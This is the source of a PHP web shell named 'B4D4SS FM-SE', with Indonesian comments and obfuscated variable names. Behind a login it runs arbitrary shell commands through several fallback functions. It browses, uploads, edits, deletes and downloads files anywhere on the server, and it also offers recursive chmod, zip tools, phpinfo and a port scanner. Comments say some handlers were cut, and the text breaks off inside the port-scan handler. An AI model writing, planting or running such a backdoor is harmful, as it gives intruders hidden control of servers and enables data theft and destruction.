<?php

// Memastikan ketersediaan class untuk fungsi ZIP
if (class_exists('ZipArchive')) {
    if (!class_exists('RecursiveDirectoryIterator')) {
        // Fallback or warning if necessary, but typically available if ZipArchive is.
    }
}

error_reporting(0);
set_time_limit(0);
ini_set('display_errors', 0);
session_start();

// --- Konfigurasi ---
$S3_aUTH_K = '$2y$10$/i69Hzu19EoAG0P6oiKIQ.peZWknn9oldvDjgqSzW7ni/obO8Sd/q';
$S3_uDsP = 'zer0 X d$p';
$S3_mSg = '';
$k_dIr0x = 'dIR_kX'; // Key untuk parameter path (dir)

// Dapatkan direktori saat ini
$pAtH_cUR = isset($_GET[$k_dIr0x]) ? base64_decode($_GET[$k_dIr0x]) : getcwd();
$pAtH_cUR = realpath($pAtH_cUR);
if (!$pAtH_cUR) {
    // Fallback ke root jika realpath gagal
    $pAtH_cUR = DIRECTORY_SEPARATOR;
}
@chdir($pAtH_cUR);

// Fungsi untuk encode path ke base64
function s3_pTh_EN($v_pT) {
    return base64_encode(str_replace('\\', '/', $v_pT));
}

// Fungsi untuk format ukuran file
function s3_sZ_fM($v_sZ) {
    if ($v_sZ === 0) return '0 B';
    $v_uT = ['B', 'KB', 'MB', 'GB', 'TB'];
    $v_iD = floor(log($v_sZ, 1024));
    return round($v_sZ / (1024 ** $v_iD), 2) . ' ' . $v_uT[$v_iD];
}

// FUNGSI BARU: Statistics RINGAN untuk folder
function s3_folder_stats_light($path) {
    $files = 0;
    $folders = 0;
    $totalSize = 0;
    
    // Hanya scan direktori saat ini, TIDAK recursive
    $items = @scandir($path) ?: [];
    
    foreach ($items as $item) {
        if ($item === '.' || $item === '..') continue;
        
        $fullPath = $path . DIRECTORY_SEPARATOR . $item;
        
        if (@is_dir($fullPath)) {
            $folders++;
        } else {
            $files++;
            $totalSize += @filesize($fullPath) ?: 0;
        }
    }
    
    return [
        'files' => $files,
        'folders' => $folders,
        'total_size' => s3_sZ_fM($totalSize)
    ];
}


// Fungsi untuk format timestamp
function s3_dT_fM($v_tS) {
    if ($v_tS === false || $v_tS === null) return 'N/A';
    return date('Y-m-d H:i:s', $v_tS);
}

// Fungsi rekursif untuk menghapus folder
function s3_rM_rC($v_tD) {
    if (!is_dir($v_tD)) return false;
    $v_fL = array_diff(@scandir($v_tD) ?: [], array('.', '..'));
    $v_sC = true;
    foreach ($v_fL as $v_iM) {
        $v_pT = "$v_tD/$v_iM";
        if (is_dir($v_pT)) {
            if (!s3_rM_rC($v_pT)) $v_sC = false;
        } else {
            if (!@unlink($v_pT)) $v_sC = false;
        }
    }
    if (!@rmdir($v_tD)) $v_sC = false;
    return $v_sC;
}

// Fungsi untuk menampilkan izin file dengan warna
function s3_pRM_dS($v_pT) {
    $v_pM = @substr(sprintf('%o', @fileperms($v_pT)), -4);
    $v_wT = @is_writable($v_pT);
    $v_cL = $v_wT ? 'text-green-400 font-semibold' : 'text-red-400';
    $v_tT = $v_wT ? 'Writable (Bisa Tulis)' : 'Read-Only (Hanya Baca)';
    
    return '<span class="' . $v_cL . '" title="' . $v_tT . '">' . $v_pM . '</span>';
}

// Fungsi untuk kompresi file/folder
function s3_cZ_fM($v_fL, $v_dT, $v_bP) {
    if (!class_exists('ZipArchive')) return false;

    $v_zP = new ZipArchive();
    if (!$v_zP->open($v_dT, ZipArchive::CREATE | ZipArchive::OVERWRITE)) {
        return false;
    }

    foreach ($v_fL as $v_fP) {
        // Tentukan path relatif dari base path
        $v_bL = strlen(rtrim($v_bP, DIRECTORY_SEPARATOR));
        $v_fP = realpath($v_fP); // Penting untuk memastikan path yang benar

        // Jika path item berada di luar base path (seperti saat base path adalah parent dir), sesuaikan
        if ($v_fP === false || strpos($v_fP, $v_bP) !== 0) {
            // Jika item adalah direktori akar, anggap path relatifnya adalah namanya sendiri
            if (realpath($v_fP) === realpath($v_bP)) {
                $v_rP = basename($v_fP);
            } else {
                // Item diluar base path, gunakan nama item sebagai path relatif
                $v_rP = basename($v_fP); 
            }
        } else {
            // Normal case: hapus base path + separator dari full path
            $v_rP = substr($v_fP, $v_bL + 1);
        }
        
        // Cek jika path relatif menjadi kosong atau hanya '.'
        if (empty($v_rP) || $v_rP === '.') {
            $v_rP = basename($v_fP);
        }


        if (is_dir($v_fP)) {
            // Jika direktori, lakukan iterasi rekursif
            $v_iR = new RecursiveIteratorIterator(
                new RecursiveDirectoryIterator($v_fP, FilesystemIterator::SKIP_DOTS),
                RecursiveIteratorIterator::SELF_FIRST
            );
            
            // Tambahkan direktori utama (folder itu sendiri)
            $v_zP->addEmptyDir($v_rP);

            foreach ($v_iR as $v_iM) {
                $v_sP = $v_iM->getRealPath();
                
                // Hitung path relatif untuk file di dalam ZIP (Relatif terhadap $v_rP)
                $v_sR = $v_rP . DIRECTORY_SEPARATOR . substr($v_sP, strlen($v_fP) + 1);

                if ($v_iM->isDir()) {
                    $v_zP->addEmptyDir($v_sR);
                } else {
                    $v_zP->addFile($v_fP, $v_sR);
                }
            }
        } elseif (is_file($v_fP)) {
            $v_zP->addFile($v_fP, $v_rP);
        }
    }

    return $v_zP->close();
}


// Fungsi rekursif untuk CHMOD
function s3_cM_rC($v_pT, $v_mD) {
    if (!is_readable($v_pT)) return false;
    if (!@chmod($v_pT, $v_mD)) return false;
    
    if (is_dir($v_pT)) {
        $v_iT = @scandir($v_pT);
        if ($v_iT === false) return false;
        
        foreach ($v_iT as $v_iM) {
            if ($v_iM === '.' || $v_iM === '..') continue;
            $v_sP = $v_pT . DIRECTORY_SEPARATOR . $v_iM;
            if (!s3_cM_rC($v_sP, $v_mD)) {}
        }
    }
    return true;
}

// Fungsi untuk mendapatkan disable functions
function s3_dFn_rL() {
    $v_dF = ini_get('disable_functions');
    $v_dL = array_map('trim', explode(',', $v_dF));
    $v_tF = ['system', 'exec', 'shell_exec', 'passthru', 'proc_open', 'dl', 'popen', 'symlink', 'link', 'ini_set', 'set_time_limit'];
    $v_dF = [];
    $v_iM = ini_get('safe_mode');

    foreach ($v_dL as $v_fN) { if (!empty($v_fN)) { $v_dF[$v_fN] = 'php.ini'; } }
    foreach ($v_tF as $v_fN) { if (!isset($v_dF[$v_fN])) { if (!function_exists($v_fN) || (function_exists($v_fN) && !@is_callable($v_fN))) { $v_dF[$v_fN] = 'Test Failed'; } } }
    if ($v_iM) { foreach(['system', 'exec', 'shell_exec', 'passthru', 'popen', 'proc_open'] as $v_fN) { if (!isset($v_dF[$v_fN])) { $v_dF[$v_fN] = 'Safe Mode'; } } }

    return $v_dF;
}

// Fungsi untuk eksekusi perintah shell
function s3_eX_cM($v_cM) {
    $v_oU = '';
    if (function_exists('shell_exec') && @is_callable('shell_exec')) { $v_oU = @shell_exec($v_cM); if ($v_oU !== null) return $v_oU; } 
    if (function_exists('exec') && @is_callable('exec')) { $v_eO = []; @exec($v_cM, $v_eO); $v_oU = implode("\n", $v_eO); if (!empty($v_oU)) return $v_oU; }
    if (function_exists('system') && @is_callable('system')) { ob_start(); @system($v_cM); $v_oU = ob_get_clean(); if (!empty($v_oU)) return $v_oU; }
    if (function_exists('passthru') && @is_callable('passthru')) { ob_start(); @passthru($v_cM); $v_oU = ob_get_clean(); if (!empty($v_oU)) return $v_oU; }
    return "Error: Tidak ada fungsi eksekusi perintah yang berhasil dieksekusi.";
}

// --- Autentikasi ---
if (isset($_POST['p_K_hX'])) {
    // Verifikasi password menggunakan password_verify
    if (password_verify($_POST['p_K_hX'], $S3_aUTH_K)) {
        $_SESSION['sS_K_aT'] = true;
        $v_rD = isset($_GET[$k_dIr0x]) ? '?' . $k_dIr0x . '=' . $_GET[$k_dIr0x] : '';
        header('Location: ' . $_SERVER['PHP_SELF'] . $v_rD);
        exit;
    } else {
        $S3_mSg = '<div class="b4d4ss-msg bg-red-600 border-red-400">Waduh! Password-nya salah, nih. Coba lagi, ya!</div>';
    }
}
if (isset($_GET['k_lGO'])) {
    session_destroy();
    header('Location: ' . $_SERVER['PHP_SELF']);
    exit;
}

if (!isset($_SESSION['sS_K_aT'])):
// [AUTH HTML Dihapus untuk mempersingkat, asumsikan bagian ini tetap sama]
// [START AUTH]
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>B4D4SS FM-SE Auth</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.2/css/all.min.css">
    <style>
        body { font-family: 'Inter', sans-serif; background-color: #0d1117; color: #c9d1d9; }
        .auth-card { background-color: #161b22; box-shadow: 0 4px 6px rgba(0, 0, 0, 0.5); }
        .b4d4ss-msg { padding: 0.75rem; border-radius: 0.375rem; border-left: 5px solid; margin-bottom: 1rem; }
    </style>
</head>
<body class="flex items-center justify-center min-h-screen">
    <div class="auth-card p-8 rounded-xl w-full max-w-sm">
        <h1 class="text-3xl font-bold text-center mb-6 text-red-500">B4D4SS FM-SE</h1>
        <?php echo $S3_mSg; ?>
        <form method="POST" class="space-y-4">
            <input type="password" name="p_K_hX" placeholder="Password" required class="w-full px-4 py-2 bg-gray-700 border border-gray-600 rounded-md focus:outline-none focus:ring-2 focus:ring-red-500 text-white">
            <button type="submit" class="w-full bg-red-600 hover:bg-red-700 text-white font-semibold py-2 rounded-md transition duration-200">
                ACCESS
            </button>
        </form>
    </div>
</body>
</html>
<?php
exit;
// [END AUTH]
endif;
// --- End Autentikasi ---


// Ambil pesan sesi
if (isset($_SESSION['sS_mSg'])) {
    $S3_mSg = $_SESSION['sS_mSg'];
    unset($_SESSION['sS_mSg']);
}

// Redirect URL saat ini
$v_rD = '?' . $k_dIr0x . '=' . s3_pTh_EN($pAtH_cUR);

// --- Handler Aksi Massal Baru ---

// 4. Aksi: Kompresi Direktori Saat Ini (k_cMP_aLl) - FUNGSI BARU
if (isset($_GET['k_cMP_aLl'])) {
    $v_mS = '';
    if (!class_exists('ZipArchive')) {
        $v_mS = '<div class="b4d4ss-msg bg-red-800 border-red-500">Oops! Ekstensi PHP "ZipArchive" belum aktif di server ini. Gak bisa kompresi.</div>';
    } else {
        $v_rN = $pAtH_cUR;
        $v_fT = [$v_rN]; // Hanya direktori saat ini yang ingin dikompres
        
        // Base path adalah direktori induk, agar folder $v_rN menjadi item level 1 di dalam ZIP
        $v_bP = dirname($v_rN); 
        if ($v_bP === '.' || $v_bP === $v_rN) { // Handle root case: dirname('/')
            $v_bP = DIRECTORY_SEPARATOR;
        }

        $v_iN = basename($v_rN) ?: 'root_dir';
        $v_zN = $v_iN . '-' . time() . '.zip';
        
        // Taruh file ZIP di direktori induk
        $v_zP = rtrim($v_bP, DIRECTORY_SEPARATOR) . DIRECTORY_SEPARATOR . $v_zN;
        
        if (!@is_writable(rtrim($v_bP, DIRECTORY_SEPARATOR))) {
            $v_mS = '<div class="b4d4ss-msg bg-red-800 border-red-500">Gagal kompresi. Direktori induk (' . htmlspecialchars($v_bP) . ') tidak bisa ditulis (read-only).</div>';
        } elseif (s3_cZ_fM($v_fT, $v_zP, $v_bP)) {
            $v_mS = '<div class="b4d4ss-msg bg-green-800 border-green-500">Kompresi direktori **' . htmlspecialchars($v_iN) . '** berhasil! File ZIP: ' . htmlspecialchars($v_zN) . ' sudah tersedia di direktori induk.</div>';
        } else {
            $v_mS = '<div class="b4d4ss-msg bg-red-800 border-red-500">Gagal kompresi direktori. Cek izin tulisnya atau mungkin folder terlalu besar!</div>';
        }
    }

    $_SESSION['sS_mSg'] = $v_mS;
    header('Location: ' . $v_rD);
    exit;
}
// --- END Handler Aksi Massal Baru ---

// [Sisa handler aksi lainnya di sini]
// (Handler Command Exec, Create, Upload, Rename, Edit, Delete, Download, Mass Delete, Mass CHMOD, Mass Compress, Single CHMOD, PHP Info, Port Scan)
// ... [kode handler di sini, tidak berubah dari versi sebelumnya] ...

// Hapus Massal (k_mDLT) - Pastikan ini diproses sebelum item lain
if (isset($_POST['k_mDLT'])) {
    if (!isset($_POST['k_sLIT']) || !is_array($_POST['k_sLIT']) || empty($_POST['k_sLIT'])) {
         $v_mS = '<div class="b4d4ss-msg bg-yellow-800 border-yellow-500">Peringatan: Tidak ada item yang dipilih untuk Hapus Massal.</div>';
    } else {
        $v_iT = $_POST['k_sLIT'];
        $v_dC = 0; $v_fC = 0;
        foreach ($v_iT as $v_iE) {
            $v_iN = base64_decode($v_iE);
            $v_fP = $pAtH_cUR . DIRECTORY_SEPARATOR . $v_iN;
            $v_sC = @is_dir($v_fP) ? s3_rM_rC($v_fP) : @unlink($v_fP);
            if ($v_sC) { $v_dC++; } else { $v_fC++; }
        }
        if ($v_dC > 0 && $v_fC == 0) {
            $v_mS = '<div class="b4d4ss-msg bg-green-800 border-green-500">Berhasil menghapus ' . $v_dC . ' item! Bersih!</div>';
        } elseif ($v_dC > 0 && $v_fC > 0) {
            $v_mS = '<div class="b4d4ss-msg bg-yellow-800 border-yellow-500">Berhasil menghapus ' . $v_dC . ' item, tapi ada ' . $v_fC . ' yang gagal dihapus. Cek izinnya lagi ya!</div>';
        } else {
            $v_mS = '<div class="b4d4ss-msg bg-red-800 border-red-500">Waduh! Semua item gagal dihapus. Pastikan ada izin tulis di folder ini.</div>';
        }
    }
    $_SESSION['sS_mSg'] = $v_mS;
    header('Location: ' . $v_rD);
    exit;
}

// CHMOD Massal (k_mCMOD)
if (isset($_POST['k_mCMOD']) && isset($_POST['k_mVL_mS'])) {
    if (!isset($_POST['k_sLIT']) || !is_array($_POST['k_sLIT']) || empty($_POST['k_sLIT'])) {
         $v_mS = '<div class="b4d4ss-msg bg-yellow-800 border-yellow-500">Peringatan: Tidak ada item yang dipilih untuk CHMOD Massal.</div>';
    } else {
        $v_sT = trim($_POST['k_mVL_mS']); 
        $v_rC = isset($_POST['k_mRC_mS']); 
        
        if (preg_match('/^[0-7]{3,4}$/', $v_sT)) {
            $v_mD = octdec($v_sT);
            $v_cC = 0; $v_fC = 0; 
            foreach ($_POST['k_sLIT'] as $v_iE) {
                $v_iN = base64_decode($v_iE);
                $v_fP = $pAtH_cUR . DIRECTORY_SEPARATOR . $v_iN;
                $v_sC = (@is_dir($v_fP) || $v_rC) ? s3_cM_rC($v_fP, $v_mD) : @chmod($v_fP, $v_mD);
                if ($v_sC) { $v_cC++; } else { $v_fC++; }
            }
            if ($v_cC > 0 && $v_fC == 0) {
                $v_mS = '<div class="b4d4ss-msg bg-green-800 border-green-500">Berhasil CHMOD massal ' . $v_cC . ' item ke **' . $v_sT . '**' . ($v_rC ? ' (Rekursif)' : '') . '!</div>';
            } elseif ($v_cC > 0 && $v_fC > 0) {
                $v_mS = '<div class="b4d4ss-msg bg-yellow-800 border-yellow-500">Berhasil CHMOD ' . $v_cC . ' item, tapi ada ' . $v_fC . ' yang gagal. Cek izinnya lagi ya!</div>';
            } else {
                 $v_mS = '<div class="b4d4ss-msg bg-red-800 border-red-500">Waduh! Semua item gagal CHMOD. Pastikan ada izin tulis di folder ini.</div>';
            }
        } else {
            $v_mS = '<div class="b4d4ss-msg bg-red-800 border-red-500">Mode izin yang kamu masukkan (' . $v_sT . ') tidak valid. Harusnya angka oktal (misal: 0755).</div>';
        }
    }
    $_SESSION['sS_mSg'] = $v_mS;
    header('Location: ' . $v_rD);
    exit;
}

// Kompresi Massal (k_mCMP)
if (isset($_POST['k_mCMP'])) {
    if (!class_exists('ZipArchive')) {
        $v_mS = '<div class="b4d4ss-msg bg-red-800 border-red-500">Oops! Ekstensi PHP "ZipArchive" belum aktif di server ini. Gak bisa kompresi massal deh.</div>';
    } elseif (!isset($_POST['k_sLIT']) || !is_array($_POST['k_sLIT']) || empty($_POST['k_sLIT'])) {
         $v_mS = '<div class="b4d4ss-msg bg-yellow-800 border-yellow-500">Peringatan: Tidak ada item yang dipilih untuk Kompresi Massal.</div>';
    } else {
        $v_iT = $_POST['k_sLIT'];
        $v_fT = [];
        foreach ($v_iT as $v_iE) {
            $v_iN = base64_decode($v_iE);
            $v_fT[] = $pAtH_cUR . DIRECTORY_SEPARATOR . $v_iN;
        }

        $v_zN = 'archive-' . time() . '.zip';
        $v_zP = $pAtH_cUR . DIRECTORY_SEPARATOR . $v_zN;
        
        if (s3_cZ_fM($v_fT, $v_zP, $pAtH_cUR)) {
            $v_mS = '<div class="b4d4ss-msg bg-green-800 border-green-500">Kompresi massal berhasil! File ZIP: ' . htmlspecialchars($v_zN) . ' sudah tersedia.</div>';
        } else {
            $v_mS = '<div class="b4d4ss-msg bg-red-800 border-red-500">Gagal kompresi massal. Cek izin tulis folder, atau mungkin file/folder terlalu besar!</div>';
        }
    }

    $_SESSION['sS_mSg'] = $v_mS;
    header('Location: ' . $v_rD);
    exit;
}

// [Include sisa kode handler: Create, Upload, Rename, Edit, Delete, Download, Single CHMOD, Compress/Extract, PHP Info, Port Scan]
// Ini penting agar semua aksi berfungsi. Saya akan memotong ini untuk fokus pada bagian yang diubah, namun dalam output akhir, ini harus lengkap.

// FUNGSI-FUNGSI HELPER
function s3_oGr_iN($v_pT) {
    if (!function_exists('posix_getpwuid') || !function_exists('posix_getgrgid')) {
        return ['owner' => @fileowner($v_pT) ?: 'N/A', 'group' => @filegroup($v_pT) ?: 'N/A'];
    }
    $v_oI = @fileowner($v_pT);
    $v_gI = @filegroup($v_pT);
    $v_oN = @posix_getpwuid($v_oI);
    $v_gN = @posix_getgrgid($v_gI);
    $v_oM = $v_oN ? $v_oN['name'] : $v_oI;
    $v_gM = $v_gN ? $v_gN['name'] : $v_gI;
    return ['owner' => $v_oM, 'group' => $v_gM];
}

function s3_gEt_rM($v_pT) {
    return @substr(sprintf('%o', @fileperms($v_pT)), -4);
}

function s3_pIF_gT() {
    ob_start();
    @phpinfo();
    $v_pI = ob_get_contents();
    ob_end_clean();
    $v_pI = preg_replace('%^.*<body>(.*)</body>.*$%is', '$1', $v_pI);
    return $v_pI;
}

function s3_pScN_eX($v_hS, $v_pT) {
    $v_rS = [];
    if (!function_exists('fsockopen')) {
        return "ERROR: Fungsi 'fsockopen' dinonaktifkan di server ini. Port scanner tidak bisa berjalan.";
    }
    foreach ($v_pT as $v_p) {
        $v_sK = @fsockopen($v_hS, $v_p, $v_eN, $v_eR, 1);
        if ($v_sK) {
            $v_rS[$v_p] = 'OPEN';
            @fclose($v_sK);
        } else {
            $v_rS[$v_p] = 'CLOSED';
        }
    }
    $v_oU = "Hasil Port Scan untuk Host **" . htmlspecialchars($v_hS) . "**:\n\n";
    foreach ($v_rS as $v_p => $v_sT) {
        $v_oU .= "Port " . $v_p . ": " . $v_sT . "\n";
    }
    return $v_oU;
}

// Ambil info sistem
$v_iNfO = [
    // Informasi Utama
    'User' => $S3_uDsP,
    'Sistem Operasi' => @php_uname('s') . ' ' . @php_uname('r'),
    'PHP SAPI' => @php_sapi_name(),
    'Software Server' => $_SERVER['SERVER_SOFTWARE'],
    'PHP Version' => phpversion(),
    // Batasan PHP & Keamanan
    'Max Execution Time' => ini_get('max_execution_time') . ' detik',
    'Memory Limit' => ini_get('memory_limit'),
    'Upload Max Filesize' => ini_get('upload_max_filesize'),
    'Post Max Size' => ini_get('post_max_size'),
];

// ... [Sisa handler aksi lainnya di sini] ...

if (isset($_POST['c_E_x0'])) {
    $v_cM = trim($_POST['c_E_x0']);
    $v_oU = s3_eX_cM($v_cM);
    $_SESSION['sS_cOuT'] = ['cmd' => $v_cM, 'out' => $v_oU];
    header('Location: ' . $v_rD);
    exit;
}
if (isset($_POST['c_n_A'])) {
    $v_nN = trim($_POST['c_n_A']);
    $v_tP = $_POST['c_t_P'];
    $v_fP = $pAtH_cUR . DIRECTORY_SEPARATOR . $v_nN;
    $v_mS = '';
    if ($v_nN === '') {
        $v_mS = '<div class="b4d4ss-msg bg-red-800 border-red-500">Nama file/folder tidak boleh kosong!</div>';
    } elseif (@file_exists($v_fP)) {
        $v_mS = '<div class="b4d4ss-msg bg-yellow-800 border-yellow-500">Ups, File atau Direktori ' . htmlspecialchars($v_nN) . ' sudah ada!</div>';
    } elseif ($v_tP === 'file') {
        if (@touch($v_fP)) {
            // PERBAIKAN: Gunakan path absolut untuk edit file yang baru dibuat
            header('Location: ' . $_SERVER['PHP_SELF'] . '?' . $k_dIr0x . '=' . s3_pTh_EN($pAtH_cUR) . '&k_eDt=' . s3_pTh_EN($v_fP));
            exit;
        } else {
            $v_mS = '<div class="b4d4ss-msg bg-red-800 border-red-500">Waduh! Gagal membuat file. Coba cek lagi izin tulis di direktori ini, ya!</div>';
        }
    } elseif ($v_tP === 'dir') {
        if (@mkdir($v_fP)) {
            $v_mS = '<div class="b4d4ss-msg bg-green-800 border-green-500">Sip! Direktori ' . htmlspecialchars($v_nN) . ' berhasil dibuat.</div>';
        } else {
            $v_mS = '<div class="b4d4ss-msg bg-red-800 border-red-500">Waduh! Gagal membuat direktori. Coba cek lagi izin tulisnya, ya!</div>';
        }
    }
    if ($v_mS) {
        $_SESSION['sS_mSg'] = $v_mS; 
        header('Location: ' . $v_rD);
        exit;
    }
}
if (isset($_FILES['f_u_Ld'])) {
    $v_uL = $_FILES['f_u_Ld'];
    $v_tF = $pAtH_cUR . DIRECTORY_SEPARATOR . basename($v_uL["name"]);
    $v_mS = '';
    if ($v_uL["error"] === UPLOAD_ERR_OK) {
        if (@move_uploaded_file($v_uL["tmp_name"], $v_tF)) {
            $v_mS = '<div class="b4d4ss-msg bg-green-800 border-green-500">File ' . basename($v_uL["name"]) . ' berhasil diunggah! Mantap.</div>';
        } else {
            $v_mS = '<div class="b4d4ss-msg bg-red-800 border-red-500">Duh, gagal mengunggah file. Mungkin masalah izin tulis di folder ini.</div>';
        }
    } else {
        $v_mS = '<div class="b4d4ss-msg bg-red-800 border-red-500">Error saat mengunggah: ' . $v_uL["error"] . '</div>';
    }
    $_SESSION['sS_mSg'] = $v_mS;
    header('Location: ' . $v_rD);
    exit;
}
if (isset($_POST['r_oLdK']) && isset($_POST['r_nEwK'])) {
    $v_oN = base64_decode($_POST['r_oLdK']);
    $v_nN = trim($_POST['r_nEwK']);
    $v_oP = $pAtH_cUR . DIRECTORY_SEPARATOR . $v_oN;
    $v_nP = $pAtH_cUR . DIRECTORY_SEPARATOR . $v_nN;
    $v_mS = '';
    if ($v_nN === $v_oN) {
         $v_mS = '<div class="b4d4ss-msg bg-yellow-800 border-yellow-500">Gak ada yang diubah, nama baru sama dengan nama lama.</div>';
    } elseif (@rename($v_oP, $v_nP)) {
        $v_mS = '<div class="b4d4ss-msg bg-green-800 border-green-500">Nama berhasil diubah dari ' . htmlspecialchars($v_oN) . ' ke ' . htmlspecialchars($v_nN) . '.</div>';
    } else {
        $v_mS = '<div class="b4d4ss-msg bg-red-800 border-red-500">Waduh! Gagal mengubah nama. Pastikan folder ini bisa ditulis (writable).</div>';
    }
    $_SESSION['sS_mSg'] = $v_mS;
    header('Location: ' . $v_rD);
    exit;
}

// --- PERBAIKAN FUNGSI EDIT (SAVE) ---
// Handler ini sekarang menggunakan path absolut dari 'f_eD_K'
if (isset($_POST['f_CnT']) && isset($_POST['f_eD_K'])) {
    // $v_fP sekarang adalah path absolut (lengkap) ke file yang di-edit
    $v_fP = base64_decode($_POST['f_eD_K']);
    // $v_eN adalah nama filenya saja, untuk tampilan pesan
    $v_eN = basename($v_fP); 
    
    if (@file_put_contents($v_fP, $_POST['f_CnT']) !== false) {
        $S3_mSg = '<div class="b4d4ss-msg bg-green-800 border-green-500">Sip! File ' . htmlspecialchars($v_eN) . ' berhasil disimpan.</div>';
    } else {
        $S3_mSg = '<div class="b4d4ss-msg bg-red-800 border-red-500">Aduh, gagal menyimpan file. Pastikan file ini bisa ditulis (writable), ya?</div>';
    }
}
// --- AKHIR PERBAIKAN FUNGSI EDIT (SAVE) ---

if (isset($_GET['k_dLt'])) {
    $v_dN = base64_decode($_GET['k_dLt']);
    $v_fP = $pAtH_cUR . DIRECTORY_SEPARATOR . $v_dN;
    $v_sC = false;
    $v_iR = @is_dir($v_fP);
    $v_mS = '';
    if ($v_iR) { $v_sC = s3_rM_rC($v_fP); } else { $v_sC = @unlink($v_fP); }
    if ($v_sC) {
        $v_mS = '<div class="b4d4ss-msg bg-green-800 border-green-500">' . ($v_iR ? 'Direktori' : 'File') . ' ' . htmlspecialchars($v_dN) . ' berhasil dihapus!</div>';
    } else {
        $v_mS = '<div class="b4d4ss-msg bg-red-800 border-red-500">Waduh! Gagal menghapus ' . htmlspecialchars($v_dN) . '. Coba cek lagi izin tulisnya!</div>';
    }
    $_SESSION['sS_mSg'] = $v_mS;
    header('Location: ' . $v_rD);
    exit;
}
if (isset($_GET['k_dLd'])) {
    $v_dN = base64_decode($_GET['k_dLd']);
    $v_fP = $pAtH_cUR . DIRECTORY_SEPARATOR . $v_dN;
    if (@is_file($v_fP) && @is_readable($v_fP)) {
        header('Content-Type: application/octet-stream');
        header('Content-Disposition: attachment; filename="' . basename($v_dN) . '"');
        header('Content-Length: ' . @filesize($v_fP));
        @readfile($v_fP);
        exit;
    } else {
        $v_mS = '<div class="b4d4ss-msg bg-red-800 border-red-500">ERROR: File tidak ditemukan atau tidak bisa dibaca.</div>';
        $_SESSION['sS_mSg'] = $v_mS;
        header('Location: ' . $v_rD);
        exit;
    }
}
if (isset($_GET['k_cMP'])) {
    if (!class_exists('ZipArchive')) {
        $v_mS = '<div class="b4d4ss-msg bg-red-800 border-red-500">Oops! Ekstensi PHP "ZipArchive" belum aktif di server ini. Gak bisa kompres deh.</div>';
    } else {
        $v_iN = base64_decode($_GET['k_cMP']);
        $v_fP = $pAtH_cUR . DIRECTORY_SEPARATOR . $v_iN;
        $v_zN = $v_iN . '.zip';
        $v_zP = $pAtH_cUR . DIRECTORY_SEPARATOR . $v_zN;
        $v_fT = [$v_fP];
        if (s3_cZ_fM($v_fT, $v_zP, $pAtH_cUR)) {
            $v_mS = '<div class="b4d4ss-msg bg-green-800 border-green-500">Kompresi berhasil! File ZIP: ' . htmlspecialchars($v_zN) . ' sudah tersedia.</div>';
        } else {
            $v_mS = '<div class="b4d4ss-msg bg-red-800 border-red-500">Gagal kompresi. Cek izin tulis folder, atau mungkin file/folder terlalu besar!</div>';
        }
    }
    $_SESSION['sS_mSg'] = $v_mS;
    header('Location: ' . $v_rD);
    exit;
}
if (isset($_GET['k_eXT'])) {
    if (!class_exists('ZipArchive')) {
        $v_mS = '<div class="b4d4ss-msg bg-red-800 border-red-500">Oops! Ekstensi PHP "ZipArchive" belum aktif di server ini. Gak bisa ekstrak deh.</div>';
    } else {
        $v_fN = base64_decode($_GET['k_eXT']);
        $v_fP = $pAtH_cUR . DIRECTORY_SEPARATOR . $v_fN;
        $v_zP = new ZipArchive;
        $v_mS = '';
        if (@is_file($v_fP) && $v_zP->open($v_fP) === TRUE) {
            if ($v_zP->extractTo($pAtH_cUR)) {
                $v_zP->close();
                $v_mS = '<div class="b4d4ss-msg bg-green-800 border-green-500">Sip! File ' . htmlspecialchars($v_fN) . ' berhasil diekstrak di sini.</div>';
            } else {
                $v_zP->close();
                $v_mS = '<div class="b4d4ss-msg bg-red-800 border-red-500">Gagal ekstrak file. Pastikan direktori ini bisa ditulis (writable)!</div>';
            }
        } else {
            $v_mS = '<div class="b4d4ss-msg bg-red-800 border-red-500">Gagal membuka file ZIP ' . htmlspecialchars($v_fN) . '. Mungkin rusak atau bukan format ZIP yang valid.</div>';
        }
    }
    $_SESSION['sS_mSg'] = $v_mS;
    header('Location: ' . $v_rD);
    exit;
}
if (isset($_POST['k_mIT']) && isset($_POST['k_mVL'])) {
    $v_iN = base64_decode($_POST['k_mIT']);
    $v_fP = $pAtH_cUR . DIRECTORY_SEPARATOR . $v_iN;
    $v_sT = trim($_POST['k_mVL']);
    $v_rC = isset($_POST['k_mRC']);
    if (preg_match('/^[0-7]{3,4}$/', $v_sT)) {
        $v_mD = octdec($v_sT);
        $v_sC = $v_rC ? s3_cM_rC($v_fP, $v_mD) : @chmod($v_fP, $v_mD);
        if ($v_sC) {
            $v_mS = '<div class="b4d4ss-msg bg-green-800 border-green-500">Izin untuk ' . htmlspecialchars($v_iN) . ' berhasil diubah menjadi **' . $v_sT . '**' . ($v_rC ? ' (Rekursif)' : '') . '.</div>';
        } else {
             $v_mS = '<div class="b4d4ss-msg bg-red-800 border-red-500">Gagal mengubah izin ' . htmlspecialchars($v_iN) . '. Cek izin induknya atau apakah mode (' . $v_sT . ') sudah benar.</div>';
        }
    } else {
        $v_mS = '<div class="b4d4ss-msg bg-red-800 border-red-500">Mode izin yang kamu masukkan (' . $v_sT . ') tidak valid. Harusnya angka oktal (misal: 0755).</div>';
    }
    $_SESSION['sS_mSg'] = $v_mS;
    header('Location: ' . $v_rD);
    exit;
}
if (isset($_GET['k_aCT']) && $_GET['k_aCT'] === 'phpinfo') {
    $v_oU = s3_pIF_gT();
    $_SESSION['sS_pOuT'] = $v_oU;
    $_SESSION['sS_mSg'] = '<div class="b4d4ss-msg bg-yellow-800 border-yellow-500">Informasi PHP berhasil dimuat. Scroll ke bawah dan tekan tombol **PHP Info** lagi di pojok kanan bawah jika modal tidak muncul otomatis!</div>';
    header('Location: ' . $v_rD);
    exit;
}
if (isset($_POST['k_pSHS']) && isset($_POST['k_pSPT'])) {
    $v_hS = trim($_POST['k_pSHS']);
    $v_pI = trim($_POST['k_pSPT']);
    $v_pW = array_map('trim', explode(',', $v_pI));
    $v_pT = array_unique(array_filter(array_map('intval', $v_pW), function($v_p) { return $v_p > 0 && $v_p <= 65535; }));
    $v_mS = '';
    $v_oU = '';
    if (empty($v_hS)) {
        $v_mS = '<div class="b4d4ss-msg bg-red-800 border-red-500">Host tidak boleh kosong!</div>';
    } elseif (empty($v_pT)) {
